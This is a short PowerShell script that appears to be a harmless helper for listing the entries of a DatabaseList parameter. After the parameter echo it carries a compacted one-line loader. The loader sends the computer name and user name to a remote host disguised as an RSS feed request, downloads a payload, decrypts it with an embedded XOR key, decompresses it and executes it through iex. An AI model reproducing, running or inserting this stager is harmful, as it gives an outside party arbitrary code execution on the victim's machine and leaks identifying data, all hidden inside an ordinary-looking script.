﻿param( 

	[String[]] $DatabaseList

	)
	







"The number of parameters passed in DatabaseList is $($DatabaseList.Count)"

$i = 0
foreach ($arg in $DatabaseList) { echo "The $i parameter in DatabaseList is $arg"; $i++ }


$sha1 = New-Object System.Security.Cryptography.SHA1CryptoServiceProvider; $vc=$env:computername; $vu=$env:username; $vh=[system.convert]::tobase64string($sha1.ComputeHash([system.text.encoding]::utf8.getbytes($vc+$vu+$(gwmi win32_bios)))); $vs=[system.convert]::tobase64string([system.text.encoding]::utf8.getbytes($vc+'|'+$vu+'|'+'903f2f8cf535578b8c63dfcf5f1d3f549e489101')); $u='http://vanity-fair.org/news/rss.php?q='+$vs; $ps=(New-Object Net.WebClient).DownloadString($u); $ps=[Convert]::FromBase64String($ps); $n=$ps[0]; $k=$ps[1..$n]; $d=$ps[($n+1)..$ps.count]; for ($i=0; $i -lt $d.count -and $i -lt 1024; $i++){ $d[$i] = $d[$i] -bxor $k[$i % $n]; }; iex $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$d)), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd()
